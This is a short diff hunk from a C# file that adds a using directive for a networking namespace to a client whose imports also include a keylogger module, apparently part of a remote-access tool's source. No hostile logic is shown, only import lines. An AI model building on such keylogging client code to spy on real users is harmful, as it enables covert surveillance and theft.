@@ -7,6 +7,7 @@ using xClient.Config;
 using xClient.Core;
 using xClient.Core.Commands;
 using xClient.Core.Keylogger;
+using xClient.Core.Networking;
 using xClient.Core.Packets;
 
 namespace xClient
